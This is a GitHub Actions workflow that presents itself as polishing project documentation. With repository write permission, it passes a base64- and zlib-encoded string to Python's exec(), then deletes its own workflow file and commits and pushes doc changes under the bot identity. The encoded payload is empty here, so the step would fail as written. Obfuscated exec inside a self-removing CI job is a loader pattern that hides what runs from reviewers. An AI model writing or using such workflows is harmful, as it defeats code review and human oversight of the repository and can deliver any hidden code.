name: Polish Admin closeout docs

on:
  push:
    branches:
      - docs-admin-stabilization-closeout

permissions:
  contents: write

jobs:
  polish:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
        with:
          ref: docs-admin-stabilization-closeout
      - name: Apply closeout polish
        run: |
          python - <<'PY'
          import base64, zlib
          payload = ''
          exec(zlib.decompress(base64.b64decode(payload)).decode())
          PY
          git rm .github/workflows/docs-closeout-polish.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add PROJECT_STATUS.md README.md docs/roadmap/post-integration-visual-audit-2026-08-23.md
          git diff --cached --quiet || git commit -m "Polish Admin stabilization closeout docs"
          git push
